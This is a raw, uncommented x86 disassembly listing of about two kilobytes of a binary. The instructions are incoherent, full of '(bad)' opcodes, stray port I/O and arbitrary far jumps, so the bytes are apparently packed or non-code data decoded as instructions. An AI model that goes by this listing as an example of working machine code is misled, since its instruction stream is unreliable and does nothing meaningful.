  4186c9:	mov    dl,0x5d
  4186cb:	jp     0x41870b
  4186cd:	pop    esi
  4186ce:	lods   eax,DWORD PTR es:[esi]
  4186d0:	popf   
  4186d1:	(bad)  [ebp+0x20d62eaa]
  4186d7:	adc    eax,0x8065d618
  4186dc:	outs   dx,BYTE PTR ds:[esi]
  4186dd:	cmp    ah,ah
  4186df:	ins    BYTE PTR es:[edi],dx
  4186e0:	xor    ah,bl
  4186e2:	jno    0x418715
  4186e4:	jbe    0x4186bf
  4186e6:	jecxz  0x41870f
  4186e8:	and    ecx,DWORD PTR [ebx*4+0x915c860]
  4186ef:	xchg   esp,eax
  4186f0:	xchg   esp,eax
  4186f1:	jnp    0x418760
  4186f3:	imul   eax,DWORD PTR [eax-0x405d812],0xe7f96d18
  4186fd:	ins    DWORD PTR es:[edi],dx
  4186fe:	mov    cl,0x2f
  418700:	sbb    esp,DWORD PTR [edi-0x650430c9]
  418706:	and    esi,ebx
  418708:	test   DWORD PTR [edx],esi
  41870a:	xor    al,0xcf
  41870c:	ins    BYTE PTR es:[edi],dx
  41870d:	ds add eax,0x37db7a35
  418713:	scas   al,BYTE PTR es:[edi]
  418714:	mov    BYTE PTR [esi+ebx*8-0x39dff07f],ch
  41871b:	xchg   edi,eax
  41871c:	jmp    0xffc6:0x6c7d0f4a
  418723:	call   0xf396fc89
  418728:	rcr    esp,1
  41872a:	add    cl,BYTE PTR [ecx-0x2f4d3137]
  418730:	or     al,0xb9
  418732:	sub    dl,dh
  418734:	pushf  
  418735:	popf   
  418736:	mov    al,ds:0x567498cd
  41873b:	pop    esi
  41873c:	(bad)  
  41873d:	mov    ecx,0xb2646f92
  418742:	cmp    dh,BYTE PTR [edx]
  418744:	pop    edi
  418745:	xchg   edi,eax
  418746:	cmp    ecx,esp
  418748:	scas   eax,DWORD PTR es:[edi]
  418749:	int3   
  41874a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41874b:	push   ebx
  41874c:	cmp    eax,0x9fab084b
  418751:	leave  
  418752:	popa   
  418753:	dec    eax
  418754:	mov    edi,?
  418756:	mov    dh,BYTE PTR [ecx]
  418758:	cmp    eax,0xeab74c9b
  41875d:	data16 jns 0x4187d9
  418760:	into   
  418761:	std    
  418762:	xchg   ebx,eax
  418763:	pop    edi
  418764:	(bad)  
  418765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418766:	jp     0x418776
  418768:	div    BYTE PTR [ecx]
  41876a:	pop    eax
  41876b:	std    
  41876c:	push   ebx
  41876d:	and    al,0x61
  41876f:	addr16 xor al,0x3
  418772:	push   eax
  418773:	mov    esi,DWORD PTR [ecx-0x54]
  418776:	xchg   esp,eax
  418777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418778:	xor    DWORD PTR [edi+0x1c1344fc],esi
  41877e:	aas    
  41877f:	in     al,dx
  418780:	out    0x1f,al
  418782:	daa    
  418783:	fidiv  DWORD PTR gs:[ebp+0x5]
  418787:	xchg   esi,eax
  418788:	stc    
  418789:	cmc    
  41878a:	in     eax,dx
  41878b:	out    0x1c,eax
  41878d:	je     0x418734
  41878f:	mov    DWORD PTR [eax-0x51],edx
  418792:	popf   
  418793:	clc    
  418794:	push   ebp
  418795:	pop    ss
  418796:	cmp    BYTE PTR [eax],dl
  418798:	ret    
  418799:	loop   0x4187ab
  41879b:	test   BYTE PTR [edx-0x7c],0x12
  41879f:	add    BYTE PTR [esi],cl
  4187a1:	inc    ebp
  4187a2:	xchg   DWORD PTR [ecx-0x6b],esi
  4187a5:	mov    bl,BYTE PTR [ebx-0x46e9a12f]
  4187ab:	cmp    BYTE PTR [ebp-0x5a244cfd],cl
  4187b1:	mov    ds:0xea6327e,eax
  4187b6:	aaa    
  4187b7:	mov    dl,0xf0
  4187b9:	pop    ebp
  4187ba:	jle    0x4187e0
  4187bc:	(bad)  
  4187bd:	sub    al,dl
  4187bf:	leave  
  4187c0:	sub    BYTE PTR [eax],0xdf
  4187c3:	sbb    DWORD PTR [edx],ebx
  4187c5:	pop    ecx
  4187c6:	out    0x3f,eax
  4187c8:	gs jl  0x4187ee
  4187cb:	lock cwde 
  4187cd:	nop
  4187ce:	repz shr DWORD PTR [ecx-0x17b7dcb1],1
  4187d5:	jns    0x41883c
  4187d7:	in     al,dx
  4187d8:	jbe    0x4187c9
  4187da:	or     ch,BYTE PTR [ecx-0x73]
  4187dd:	sub    ebp,ecx
  4187df:	(bad)  
  4187e0:	xchg   esp,eax
  4187e1:	loop   0x41876f
  4187e3:	pop    ecx
  4187e4:	ror    ch,0xe5
  4187e7:	xchg   ebx,eax
  4187e8:	int    0x75
  4187ea:	mov    ah,0xdd
  4187ec:	arpl   WORD PTR gs:[ebx-0x7e],sp
  4187f0:	mov    ds:0x835a8a68,al
  4187f5:	out    0x28,al
  4187f7:	mov    ebp,DWORD PTR [eax]
  4187f9:	mov    esp,0x61e0b765
  4187fe:	xor    eax,0x4cd3819d
  418803:	mov    edi,0x99d71bf9
  418808:	adc    DWORD PTR [esi],edi
  41880a:	jle    0x41879b
  41880c:	sbb    DWORD PTR [ebx+eiz*8-0x7a150239],0x525b64aa
  418817:	and    bh,ch
  418819:	icebp  
  41881a:	aas    
  41881b:	dec    ebx
  41881c:	mov    esp,0xe13ec2fc
  418821:	pop    es
  418822:	jmp    0x4187f6
  418824:	fdiv   QWORD PTR [edx]
  418826:	or     DWORD PTR ds:0xcd16eadc,0xffffff8b
  41882d:	adc    BYTE PTR [eax],ah
  41882f:	add    dl,BYTE PTR [ebx+0x5b]
  418832:	mov    ds:0xdb05b3a7,al
  418837:	ror    BYTE PTR ds:0x4ef1c698,cl
  41883d:	leave  
  41883e:	pop    edi
  41883f:	mov    DWORD PTR [edx+0x561f3df],edi
  418845:	mov    BYTE PTR [edx+0xd],cl
  418848:	jmp    0x418810
  41884a:	jp     0x4188a6
  41884c:	js     0x41884f
  41884e:	xor    dh,al
  418850:	pop    esi
  418851:	push   es
  418852:	adc    eax,0xaa12c258
  418857:	push   ebx
  418858:	or     DWORD PTR [edi+0x37],eax
  41885b:	mov    al,0x9d
  41885d:	jb     0x41885f
  41885f:	mov    edx,0x841706b0
  418864:	clc    
  418865:	jbe    0x418816
  418867:	leave  
  418868:	add    edx,DWORD PTR [ecx-0x33]
  41886b:	popf   
  41886c:	fcom   DWORD PTR [esi]
  41886e:	retf   0xfae5
  418871:	mov    edx,DWORD PTR [esi+eiz*8-0x22da817b]
  418878:	ins    DWORD PTR es:[edi],dx
  418879:	mov    eax,0xec24d52d
  41887e:	and    al,ch
  418880:	cmp    BYTE PTR [eax+0x1],ch
  418883:	adc    BYTE PTR [ebx],dh
  418885:	adc    eax,0x9c9783c7
  41888a:	ss in  al,0xf1
  41888d:	or     al,0xc2
  41888f:	sahf   
  418890:	inc    eax
  418891:	call   0x4f7a:0x3b69f109
  418898:	retf   0xbfd3
  41889b:	loope  0x41882e
  41889d:	push   ecx
  41889e:	repnz push edi
  4188a0:	and    DWORD PTR [ebp-0x1b],esp
  4188a3:	outs   dx,BYTE PTR ds:[esi]
  4188a4:	push   0xffffff8b
  4188a6:	push   ebx
  4188a7:	and    DWORD PTR [edx+0x1b455a87],0x5e0246d5
  4188b1:	xlat   BYTE PTR ds:[ebx]
  4188b2:	jns    0x4188d0
  4188b4:	(bad)
  4188b8:	fadd   DWORD PTR [ecx]
  4188ba:	ja     0x4188eb
  4188bc:	xor    BYTE PTR [edx],0xc5
  4188bf:	push   cs
  4188c0:	imul   edx,esi,0xffffffc3
  4188c3:	out    dx,al
  4188c4:	mov    eax,ds:0xfcaed7e7
  4188c9:	loopne 0x4188b7
  4188cb:	cmp    eax,0xe4329f05
  4188d0:	lods   eax,DWORD PTR ds:[esi]
  4188d1:	pop    edi
  4188d2:	faddp  st(0),st
  4188d4:	jge    0x4188d3
  4188d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188d7:	or     ch,BYTE PTR [eax]
  4188d9:	xor    al,BYTE PTR [eax]
  4188db:	lahf   
  4188dc:	push   ebx
  4188dd:	dec    ebx
  4188de:	pop    edx
  4188df:	retf   0xd88b
  4188e2:	xchg   ebp,eax
  4188e3:	push   eax
  4188e4:	cmp    al,0x71
  4188e6:	fcomp  QWORD PTR [edi]
  4188e8:	das    
  4188e9:	aaa    
  4188ea:	icebp  
  4188eb:	fsub   st,st(2)
  4188ed:	ss mov bh,0xc7
  4188f0:	std    
  4188f1:	(bad)
  4188f4:	adc    ax,0x15e8
  4188f8:	inc    esi
  4188f9:	xchg   esp,eax
  4188fa:	xlat   BYTE PTR ds:[ebx]
  4188fb:	ss loope 0x418903
  4188fe:	xchg   edi,eax
  4188ff:	cmc    
  418900:	inc    ecx
  418901:	sbb    eax,0xaf5e7c16
  418906:	vmread DWORD PTR [eax],eax
  418909:	retf   
  41890a:	add    ah,BYTE PTR [eax+esi*8]
  41890d:	jmp    0x418959
  41890f:	repz call 0xc1e6:0xa022d799
  418917:	ret    
  418918:	xchg   esi,eax
  418919:	ins    DWORD PTR es:[edi],dx
  41891a:	or     eax,0xdcee2b42
  41891f:	adc    cl,cl
  418921:	pop    ecx
  418922:	push   0xd2608f7b
  418927:	xchg   BYTE PTR [edi],ch
  418929:	sar    DWORD PTR [eax],cl
  41892b:	pop    esi
  41892c:	clc    
  41892d:	mov    ch,0x5f
  41892f:	jmp    0x63d5:0xb632c7eb
  418936:	inc    edx
  418937:	mov    eax,ds:0x1c1650e7
  41893c:	push   cs
  41893d:	addr16 stc 
  41893f:	stos   BYTE PTR es:[edi],al
  418940:	ds jg  0x4189b7
  418943:	ja     0x41899f
  418945:	mov    edx,0x91220f37
  41894a:	pop    edx
  41894b:	pop    esp
  41894c:	ret    0x55fd
  41894f:	add    eax,0xb63294c6
  418954:	xchg   esp,eax
  418955:	rcr    cl,cl
  418957:	ja     0x41898b
  418959:	push   ss
  41895a:	adc    dh,BYTE PTR [ebx+0x60af415c]
  418960:	push   ebp
  418961:	sub    DWORD PTR [esi-0x5d],0x5209bc3f
  418968:	(bad)  
  418969:	xor    DWORD PTR [esi+esi*1+0x24],esp
  41896d:	sub    ah,BYTE PTR [ebx]
  41896f:	mov    eax,0x2eab816a
  418974:	hlt    
  418975:	das    
  418976:	xchg   ebp,eax
  418977:	sub    eax,0xb8bf49a8
  41897c:	adc    eax,0xf974db4d
  418981:	xor    DWORD PTR [ecx-0x73],esi
  418984:	aas    
  418985:	jle    0x418931
  418987:	dec    ecx
  418988:	or     esi,ebp
  41898a:	cs mov al,0x56
  41898d:	xchg   dh,al
  41898f:	out    dx,al
  418990:	int3   
  418991:	jg     0x4189b6
  418993:	in     al,0x9d
  418995:	push   cs
  418996:	lods   al,BYTE PTR ds:[esi]
  418997:	test   al,0x5c
  418999:	in     eax,0x76
  41899b:	add    DWORD PTR [esi+0x4a5450af],edi
  4189a1:	mul    BYTE PTR [esi]
  4189a3:	dec    ebx
  4189a4:	js     0x4189b8
  4189a6:	pusha  
  4189a7:	or     esp,esp
  4189a9:	pop    ecx
  4189aa:	mov    cl,0xf1
  4189ac:	push   eax
  4189ad:	in     al,dx
  4189ae:	sti    
  4189af:	add    al,0x31
  4189b1:	stc    
  4189b2:	and    al,0x64
  4189b4:	stos   BYTE PTR es:[edi],al
  4189b5:	pop    ds
  4189b6:	inc    esi
  4189b7:	cwde   
  4189b8:	stc    
  4189b9:	shl    BYTE PTR [eax+0xf43aede],cl
  4189bf:	mov    ah,BYTE PTR [edi]
  4189c1:	sbb    al,0x3c
  4189c3:	ins    DWORD PTR es:[edi],dx
  4189c4:	push   0xcb642540
  4189c9:	(bad)  
  4189cb:	sub    ah,cl
  4189cd:	int    0xbe
  4189cf:	push   ebp
  4189d0:	push   edi
  4189d1:	push   cs
  4189d2:	cmp    al,0xd3
  4189d4:	and    ch,BYTE PTR [eax]
  4189d6:	adc    ecx,DWORD PTR [esi]
  4189d8:	shl    BYTE PTR [eax-0x34],cl
  4189db:	fsub   st,st(4)
  4189dd:	bound  ecx,QWORD PTR [ebx-0x41370708]
  4189e3:	lods   eax,DWORD PTR ds:[esi]
  4189e4:	shl    DWORD PTR [ecx],0x17
  4189e7:	sub    BYTE PTR [edx+0x13d5b836],0x68
  4189ee:	scas   eax,DWORD PTR es:[edi]
  4189ef:	mov    edi,0x4f482ba0
  4189f4:	loopne 0x418a73
  4189f6:	adc    ebp,ecx
  4189f8:	mov    bl,0xb2
  4189fa:	popa   
  4189fb:	cwde   
  4189fc:	xchg   edx,eax
  4189fd:	lock call 0x794d8317
  418a03:	inc    edx
  418a04:	lds    eax,FWORD PTR [ebx-0x5]
  418a07:	xor    DWORD PTR [edx-0x53929e55],edi
  418a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a0e:	add    cl,dl
  418a10:	add    BYTE PTR [edx-0x7],al
  418a13:	inc    ebp
  418a14:	dec    ecx
  418a15:	mov    edi,0x87b9c2d2
  418a1a:	loop   0x418a3b
  418a1c:	xchg   DWORD PTR [eax-0x9],ebx
  418a1f:	icebp  
  418a20:	pop    ecx
  418a21:	and    ebp,esp
  418a23:	mov    dh,0x59
  418a25:	(bad)  
  418a27:	jbe    0x418a15
  418a29:	push   esp
  418a2a:	or     edi,DWORD PTR [edx-0x1739941a]
  418a30:	cmp    al,0x8b
  418a32:	mov    bl,0x7d
  418a34:	js     0x418a6d
  418a36:	mov    ebx,0x252beb5e
  418a3b:	jl     0x418a43
  418a3d:	pop    ds
  418a3e:	mov    bl,BYTE PTR [eax+0x7df2ec0d]
  418a44:	jno    0x4189d9
  418a46:	fcom   QWORD PTR [ebp-0x6b]
  418a49:	lahf   
  418a4a:	call   0xea29:0xd2ba86e3
  418a51:	push   esp
  418a52:	pop    ss
  418a53:	data16 in al,0xbc
  418a56:	(bad)  
  418a57:	into   
  418a58:	ins    DWORD PTR es:[edi],dx
  418a59:	jp     0x4189ee
  418a5b:	dec    ecx
  418a5c:	imul   edx,DWORD PTR [ebx+0x14],0xffffff9e
  418a60:	gs jle 0x418a5c
  418a63:	cwde   
  418a64:	in     eax,dx
  418a65:	aas    
  418a66:	xor    eax,0xde038481
  418a6b:	ret    0xfaa5
  418a6e:	repz popw ds
  418a71:	dec    edx
  418a73:	adc    eax,0xece895fd
  418a78:	dec    edx
  418a79:	adc    DWORD PTR [ebx-0x2ea7bf7e],ebx
  418a7f:	icebp  
  418a80:	mov    al,0x38
  418a82:	ds push ebp
  418a84:	lahf   
  418a85:	sub    DWORD PTR [edx+0x49035633],ecx
  418a8b:	jno    0x418a87
  418a8d:	call   0x6a489e53
  418a92:	add    esi,DWORD PTR [eax]
  418a94:	sub    DWORD PTR [ecx-0xe],esi
  418a97:	call   0x584bfbd8
  418a9c:	ins    BYTE PTR es:[edi],dx
  418a9d:	jae    0x418ab9
  418a9f:	es pusha 
  418aa1:	fxam   
  418aa3:	push   esi
  418aa4:	push   ecx
  418aa5:	inc    ecx
  418aa6:	mov    bl,0xf3
  418aa8:	jmp    0xd02e:0x808d12dc
  418aaf:	je     0x418ab4
  418ab1:	cmp    DWORD PTR [eax-0x72ccd850],0xffffff8b
  418ab8:	xchg   edi,eax
  418ab9:	xor    eax,0x26aa3f31
  418abe:	xor    edx,ecx
  418ac0:	mov    edx,0x5503744c
  418ac5:	jp     0x418a7e
  418ac7:	ins    DWORD PTR es:[edi],dx
  418ac8:	sub    bh,BYTE PTR ds:0xefd9f3e6
  418ace:	cmp    bh,BYTE PTR [ebx-0x27]
  418ad1:	push   edi
  418ad2:	pop    ecx
  418ad3:	adc    eax,0xaa940c59
  418ad8:	js     0x418a68
  418ada:	loop   0x418b37
  418adc:	jle    0x418b5b
  418ade:	arpl   WORD PTR [edx+0x1a5fdf13],bx
  418ae4:	pop    es
  418ae5:	stos   BYTE PTR es:[edi],al
  418ae6:	push   ebp
  418ae7:	mov    ebx,0x17292447
  418aec:	test   eax,0x3a70a1d4
  418af1:	jmp    0x2ceb:0x33fdfec5
  418af8:	dec    edx
  418af9:	add    eax,0xbfac6741
  418afe:	cmp    al,0xfd
  418b00:	xor    dh,dl
  418b02:	sbb    al,0x75
  418b04:	push   edi
  418b05:	shr    BYTE PTR [edi+edx*8],cl
  418b08:	rcr    BYTE PTR [edi],cl
  418b0a:	xchg   ebp,eax
  418b0b:	call   0x9b74d3f6
  418b10:	mov    ds:0xf7c84db8,eax
  418b15:	sub    BYTE PTR [edx-0xc],ch
  418b18:	xlat   BYTE PTR ds:[ebx]
  418b19:	sub    BYTE PTR [ebp-0x7],dl
  418b1c:	stos   BYTE PTR es:[edi],al
  418b1d:	inc    ecx
  418b1e:	ficomp WORD PTR [esi-0x69de9834]
  418b24:	addr16 out dx,al
  418b26:	mov    bl,BYTE PTR [eax]
  418b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b29:	dec    edi
  418b2a:	arpl   di,bp
  418b2c:	or     BYTE PTR [edi],ah
  418b2e:	outs   dx,DWORD PTR ds:[esi]
  418b2f:	push   edx
  418b30:	mov    ecx,0x92688c56
  418b35:	cmp    eax,0x966e9cb1
  418b3a:	bound  ebp,QWORD PTR [esi+0x4e]
  418b3d:	mov    al,0x8f
  418b3f:	dec    ecx
  418b40:	sub    al,0xa
  418b42:	rcr    DWORD PTR [edi],0x7e
  418b45:	test   eax,0xb8011aff
  418b4a:	add    eax,0xab27fc7f
  418b4f:	jbe    0x418b73
  418b51:	aas    
  418b52:	(bad)  
  418b53:	and    eax,0xb6602c5d
  418b58:	or     DWORD PTR [edx-0x6],esi
  418b5b:	sbb    ecx,eax
  418b5d:	inc    ebp
  418b5e:	jmp    0x9ba7:0x19274e35
  418b65:	pop    ebx
  418b66:	mov    dl,0xc
  418b68:	(bad)  [ebx-0x62]
  418b6b:	in     eax,0x93
  418b6d:	cmp    BYTE PTR [esi+0x75],bh
  418b70:	or     al,0x84
  418b72:	mov    eax,DWORD PTR [esi+0x69]
  418b75:	and    BYTE PTR [edi],ah
  418b77:	mov    ecx,0xf8cb2834
  418b7c:	in     al,dx
  418b7d:	add    BYTE PTR [ebp-0x4d447c24],ch
  418b83:	pop    ecx
  418b84:	ss imul dl
  418b87:	in     al,0x33
  418b89:	int    0xec
  418b8b:	add    eax,0xc3c156d3
  418b90:	stc    
  418b91:	xor    BYTE PTR [esi+0x19ff96a8],dh
  418b97:	int    0x8b
  418b99:	(bad)  
  418b9a:	nop
  418b9b:	mov    edi,0x3287a250
  418ba0:	mov    dh,0x45
  418ba2:	mov    BYTE PTR [edi-0x5b94390d],dl
  418ba8:	ret    
  418ba9:	jb     0x418b42
  418bab:	xchg   esi,esi
  418bad:	mov    ebx,0x76aeda1b
  418bb2:	and    DWORD PTR [ecx],ecx
  418bb4:	enter  0x4f62,0x30
  418bb8:	push   ss
  418bb9:	or     al,0x31
  418bbb:	sbb    cl,BYTE PTR [ebx+0x44]
  418bbe:	push   eax
  418bbf:	jne    0x418b45
  418bc1:	ins    DWORD PTR es:[edi],dx
  418bc2:	dec    ebp
  418bc3:	pop    eax
  418bc4:	or     al,0x82
  418bc6:	mov    al,ds:0xe580bb08
  418bcb:	shr    al,cl
  418bcd:	pop    ds
  418bce:	iret   
  418bcf:	jns    0x418b89
  418bd1:	or     al,0x93
  418bd3:	ret    0xec49
  418bd6:	retf   
  418bd7:	sub    dl,BYTE PTR [ebx-0x17]
  418bda:	xor    BYTE PTR [eax-0x4818e596],al
  418be0:	test   al,0xd0
  418be2:	test   BYTE PTR [di+0x31ef],bh
  418be7:	jl     0x418c03
  418be9:	ror    edi,0x1e
  418bec:	bound  eax,QWORD PTR [ecx+0x1cfe8529]
  418bf2:	sub    ah,BYTE PTR [edx+0x6f]
  418bf5:	sbb    DWORD PTR [esi],esi
  418bf7:	addr16 loope 0x418bcd
  418bfa:	add    edx,esp
  418bfc:	bound  eax,QWORD PTR [ebp-0x628cbed4]
  418c02:	mov    edx,0xd43bd967
  418c07:	push   ds
  418c08:	(bad)  
  418c09:	adc    al,0x92
  418c0b:	data16 mov dl,0xc4
  418c0e:	js     0x418c3c
  418c10:	in     eax,dx
  418c11:	add    ah,BYTE PTR [edx]
  418c13:	test   bh,bl
  418c15:	or     DWORD PTR es:[ecx+0x7],0xfffffff1
  418c1a:	push   ebx
  418c1b:	scas   al,BYTE PTR es:[edi]
  418c1c:	inc    edi
  418c1d:	xor    ecx,DWORD PTR [edx]
  418c1f:	and    edi,DWORD PTR [edx]
  418c21:	jecxz  0x418bde
  418c23:	xor    ebp,esp
  418c25:	mov    ch,0x34
  418c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c28:	sub    ecx,DWORD PTR [esi-0x6]
  418c2b:	mov    al,0x69
  418c2d:	and    al,0xd0
  418c2f:	(bad)
  418c32:	sbb    eax,0x20dc1d48
  418c37:	inc    esi
  418c38:	inc    esp
  418c39:	push   ebx
  418c3a:	xchg   edi,eax
  418c3b:	mov    bh,0xe
  418c3d:	enter  0x55a4,0xb7
  418c41:	and    BYTE PTR [ebx+0x7438d0a2],ch
  418c47:	(bad)  
  418c48:	inc    BYTE PTR [edi+ebp*8-0xf]
  418c4c:	dec    ebx
  418c4d:	arpl   WORD PTR [esi+0x2],bp
  418c50:	sub    al,0xda
  418c52:	mov    bl,0x8a
  418c54:	out    0x1,eax
  418c56:	inc    eax
  418c57:	jne    0x418be6
  418c59:	ror    BYTE PTR [esi+0x6ae00b5d],0xe8
  418c60:	lock xchg esi,eax
  418c62:	mov    cl,0x4c
  418c64:	sti    
  418c65:	mov    dh,0x6f
  418c67:	jb     0x418c72
  418c69:	jo     0x418cc8
  418c6b:	push   cs
  418c6c:	jmp    0x4682:0x6029973f
  418c73:	out    0x82,al
  418c75:	loop   0x418ce4
  418c77:	mov    DWORD PTR [edi+0x2563c8b5],ebx
  418c7d:	and    BYTE PTR [edx+0xed01c67],dh
  418c83:	rol    DWORD PTR [ebx+edx*4],1
  418c86:	pusha  
  418c87:	sbb    al,BYTE PTR [esi+eax*8+0x538ad421]
  418c8e:	adc    BYTE PTR [ebx+edi*8-0x23],0xc
  418c93:	cs stos DWORD PTR es:[edi],eax
  418c95:	gs loop 0x418c96
  418c98:	outs   dx,DWORD PTR ds:[esi]
  418c99:	sbb    BYTE PTR [esp+ebx*1-0x60],dh
  418c9d:	and    al,0xf4
  418c9f:	push   eax
  418ca0:	and    eax,0xfc4570b8
  418ca5:	lods   eax,DWORD PTR gs:[esi]
  418ca7:	jmp    0x5496fd62
  418cac:	(bad)  
  418cad:	xchg   ecx,eax
  418cae:	mov    ebp,0x8b76ec7f
  418cb3:	push   cs
  418cb4:	and    BYTE PTR [edx-0x3ccfa3fe],dl
  418cba:	mov    eax,DWORD PTR [eax+eax*4+0x30]
  418cbe:	sub    al,0x8f
  418cc0:	(bad)  
  418cc1:	retf   0xee63
  418cc4:	outs   dx,DWORD PTR ds:[esi]
  418cc5:	mov    ss,WORD PTR [ecx]
  418cc7:	jnp    0x418cfa
  418cc9:	sub    BYTE PTR [ebx+edi*8-0x200f2a63],cl
  418cd0:	or     DWORD PTR [ebx-0x64809237],ecx
  418cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cd7:	call   0x4b5b:0xfdd6a0fd
  418cde:	or     al,0x1e
  418ce0:	mov    ds:0xdd564890,al
  418ce5:	push   ebp
  418ce6:	loopne 0x418d43
  418ce8:	jno    0x418cc7
  418cea:	ins    DWORD PTR es:[edi],dx
  418ceb:	lahf   
  418cec:	or     BYTE PTR ds:0xc85e131d,ch
  418cf2:	fst    DWORD PTR [edi+edi*1-0x2ae38ffb]
  418cf9:	cmp    eax,0x33856fd0
  418cfe:	push   ebx
  418cff:	mov    ebx,0x62711a23
  418d04:	or     DWORD PTR ds:[edi-0x1f4e1e],esp
  418d0b:	dec    esp
  418d0c:	mov    ah,0xb2
  418d0e:	and    DWORD PTR [edx+0x24],esi
  418d11:	sub    eax,0x6e48e74d
  418d16:	loope  0x418cad
  418d18:	xor    DWORD PTR [edx-0x56],0x51
  418d1c:	adc    eax,0x7c7d8b36
  418d21:	jnp    0x418d7b
  418d23:	outs   dx,BYTE PTR ds:[esi]
  418d24:	jbe    0x418d2d
  418d26:	cdq    
  418d27:	dec    edi
  418d28:	loop   0x418cb3
  418d2a:	xchg   ebp,eax
  418d2b:	and    DWORD PTR [edx+0x7127a787],esi
  418d31:	sbb    dh,dl
  418d33:	data16 sahf 
  418d35:	retf   0x37d4
  418d38:	xchg   edi,eax
  418d39:	std    
  418d3a:	retf   
  418d3b:	imul   edi,DWORD PTR [ecx+0x30],0x9e15745a
  418d42:	fs aad 0xb6
  418d45:	outs   dx,BYTE PTR ds:[esi]
  418d46:	mov    cs:0xbb572ee,al
  418d4c:	pop    ebx
  418d4d:	out    dx,al
  418d4e:	stos   DWORD PTR es:[edi],eax
  418d4f:	div    BYTE PTR [ebp+ebp*2-0x789cccde]
  418d56:	pop    ecx
  418d57:	jae    0x418d24
  418d59:	dec    edx
  418d5a:	adc    eax,0xfa6eb216
  418d5f:	scas   eax,DWORD PTR es:[edi]
  418d60:	enter  0x76a2,0x17
  418d64:	(bad)  
  418d65:	or     eax,0x402629b2
  418d6a:	nop
  418d6b:	test   eax,0x4908b784
  418d70:	and    al,0x12
  418d72:	mov    ah,0xc3
  418d74:	out    0x9c,al
  418d76:	adc    DWORD PTR [edx+eiz*8-0x11],edx
  418d7a:	push   0xffffffd0
  418d7c:	xchg   esp,eax
  418d7d:	mov    eax,0x1b037ecb
  418d82:	sbb    esp,DWORD PTR [edi-0x38]
  418d85:	and    DWORD PTR [ebx+0x57a64fc8],0x81a85c93
  418d8f:	fst    DWORD PTR [esi+0x79]
  418d92:	std    
  418d93:	fidivr DWORD PTR [eax+edi*4-0x2c22552f]
  418d9a:	or     eax,0x3f9b75d6
  418d9f:	retf   
  418da0:	sti    
  418da1:	mov    es,WORD PTR [ebx]
  418da3:	mov    cl,0x6e
  418da5:	sub    DWORD PTR [edi],esi
  418da7:	jecxz  0x418db0
  418da9:	fisttp WORD PTR [esi-0x3d9dffac]
  418daf:	xor    ecx,DWORD PTR [ecx-0x4b]
  418db2:	ds fs jmp 0x94f069a9
  418db9:	dec    ebp
  418dba:	dec    ebp
  418dbb:	mov    WORD PTR [edx+0x753d36a5],fs
  418dc1:	in     al,0xbe
  418dc3:	or     al,0xee
  418dc5:	pop    eax
  418dc6:	ins    BYTE PTR es:[edi],dx
  418dc7:	test   eax,0xaa8d6d0f
  418dcc:	test   al,0x38
  418dce:	mov    ch,0x43
  418dd0:	mov    cl,ch
  418dd2:	and    ecx,DWORD PTR [eax]
  418dd4:	mov    ebx,0x632f7f08
  418dd9:	xor    eax,0x5f326904
  418dde:	out    dx,al
  418ddf:	xlat   BYTE PTR ds:[ebx]
  418de0:	(bad)  
  418de1:	ss pop esp
  418de3:	bound  esp,QWORD PTR es:[esi+ebp*2]
  418de7:	pop    edx
  418de8:	aas    
  418de9:	out    dx,eax
  418dea:	popf   
  418deb:	inc    edx
  418dec:	push   esi
  418ded:	cmp    al,0x6c
  418def:	(bad)  
  418df1:	arpl   WORD PTR fs:[ecx-0x7b503610],bx
  418df8:	mov    eax,gs
  418dfa:	adc    DWORD PTR [ecx+0xe],ebx
  418dfd:	not    DWORD PTR [edx+0x37baee24]
  418e03:	stc    
  418e04:	mov    edi,0x99df7a49
  418e09:	jb     0x418e05
  418e0b:	out    0xa,eax
  418e0d:	not    DWORD PTR [edx]
  418e0f:	mov    ecx,0xaebcfda4
  418e14:	sbb    al,0x51
  418e16:	outs   dx,DWORD PTR ds:[esi]
  418e17:	cs xchg ebx,eax
  418e19:	inc    esp
  418e1a:	addr16 lock loop 0x418e3a
  418e1e:	pop    ecx
  418e1f:	lds    ecx,FWORD PTR [esi]
  418e21:	pop    ds
  418e22:	ret    
  418e23:	inc    BYTE PTR [edx]
  418e25:	ins    BYTE PTR es:[edi],dx
  418e26:	cmp    esp,ebx
  418e28:	(bad)  
  418e29:	mov    ebx,0xf319d593
  418e2e:	dec    BYTE PTR [eax-0x76]
  418e31:	or     eax,0x5500ee94
  418e36:	and    eax,0x46fcd86b
  418e3b:	cs icebp 
  418e3d:	fnstsw WORD PTR [edx+0x36d3c379]
  418e43:	popf   
  418e44:	ds in  al,dx
  418e46:	leave  
  418e47:	dec    ecx
  418e48:	daa    
  418e49:	inc    ebp
  418e4a:	mov    cs,WORD PTR [esi-0x5f906c4b]
  418e50:	imul   esp,DWORD PTR [edx],0xffffffbe
  418e53:	dec    esp
  418e54:	out    0xb0,eax
  418e56:	ret    0xf849
  418e59:	(bad)  
  418e5c:	inc    edi
  418e5d:	mov    bh,0x13
  418e5f:	mov    ch,0x39
  418e61:	out    dx,eax
  418e62:	jbe    0x418ebe
  418e64:	fstp   TBYTE PTR [edx-0x2783ef20]
  418e6a:	fisttp WORD PTR [eax-0x4c515348]
  418e70:	xchg   DWORD PTR [edx+0x1c49550d],ebp
  418e76:	add    esp,DWORD PTR [esi+0x22910f95]
  418e7c:	jnp    0x418e46
  418e7e:	mov    edi,0xe397d97e
  418e83:	sbb    al,0x5d
  418e85:	dec    esi
  418e86:	push   ss
  418e87:	je     0x418ebc
  418e89:	push   ebx
  418e8a:	cmc    
  418e8b:	ja     0x418e58
  418e8d:	test   eax,edi
  418e8f:	pop    ecx
  418e90:	mov    al,0x93
  418e92:	in     eax,dx
  418e93:	mov    esi,0xa2b3c13
  418e98:	cmp    DWORD PTR [edi-0x48],edx
  418e9b:	or     edx,DWORD PTR [edx+0x2a]
  418e9e:	sti    
  418e9f:	sub    BYTE PTR [ebx+0x65],0x35
  418ea3:	jmp    0x40e3:0xc5978582
  418eaa:	call   0x9560:0x86321da9
  418eb1:	stc    
  418eb2:	dec    esi
